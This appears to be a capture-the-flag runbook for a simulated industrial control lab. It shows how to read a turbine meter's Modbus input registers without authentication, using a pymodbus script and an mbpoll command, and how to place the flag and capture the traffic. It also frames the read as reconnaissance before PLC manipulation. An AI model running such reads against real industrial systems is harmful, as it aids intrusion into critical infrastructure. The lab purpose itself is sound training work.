# Runbook: meter unauthenticated Modbus read

Unauthenticated read of all five input registers on the revenue meter, revealing live
turbine process values. No write, no side effects.

- Technique: [2: process intelligence gathering](../../attack-surface.md)
- Challenge type: Network (PCAP)
- Difficulty: Beginner

## Components to start

```
cd ics-simlab
make generate && make build
docker compose -f zones/control/docker-compose.yml up -d uupl-meter uupl-turbine-plc
```

The meter derives its values from the turbine PLC physics engine, so the PLC needs to be
running to produce meaningful readings.

## Attack path

```python
from pymodbus.client import ModbusTcpClient

c = ModbusTcpClient('10.10.3.33', port=502)
c.connect()

r = c.read_input_registers(address=0, count=5, slave=1)
print(r.registers)
# [1487, 312, 87, 2310, 148]
# IR[0] = turbine RPM
# IR[1] = temperature (°C)
# IR[2] = pressure (bar)
# IR[3] = line voltage (V)
# IR[4] = current (A, contains flag)
```

Or with `mbpoll`:

```
mbpoll -a 1 -r 0 -c 5 -t 4 10.10.3.33
```

## Flag placement

Place the flag in `IR[4]` (current reading). In `zones/control/components/ied-meter/meter_server.py`,
set the initial value of the current register to the flag encoded as an integer, or spread a
short ASCII flag across `IR[3]` and `IR[4]` using two bytes per register.

The participant reads all five registers, notices `IR[4]` does not match expected current values,
and decodes it.

## Artefact

The PCAP contains:
* Modbus TCP request: function code 04 (read input registers), starting address 0, quantity 5
* Modbus TCP response: five 16-bit values, one of which encodes the flag
* No authentication exchange; the transaction completes in two packets

Capture with:

```
tcpdump -i any -w meter-read.pcap port 502
```

Start the capture before running the read script. Stop after the response is received.

## Unauthenticated process visibility

Any host on the control network reads live turbine telemetry without credentials. The meter
is positioned as a billing and verification device; in practice it confirms everything an
attacker needs to know before touching the PLC. The SNMP interface (port 161) exposes the
same values via a different path.

## Harder variants

The same component with a write-capable register produces the IED relay force-trip challenge.
For a harder variant, combine this read with the alarm threshold values from the IED relay trip
log to produce a challenge where the participant infers the system state before attempting
manipulation.
